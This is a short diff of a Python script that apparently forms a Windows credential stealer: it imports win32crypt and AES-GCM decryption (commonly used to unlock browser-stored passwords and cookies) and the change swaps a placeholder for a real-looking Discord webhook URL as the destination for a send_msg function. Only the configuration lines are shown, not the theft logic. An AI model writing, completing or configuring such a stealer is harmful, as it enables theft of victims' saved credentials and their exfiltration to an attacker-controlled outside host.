@@ -5,7 +5,7 @@ import requests
 import win32crypt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE"
+WEBHOOK = "https://discord.com/api/webhooks/1558722686958436352/phl6VziL9fyEWxrUiP6djCxsH1gripsdj7nA9lTK2QgAfg1_21GBtc_Rq90UAB4HOkwK"
 RUN_ONCE = False
 
 def send_msg(content):
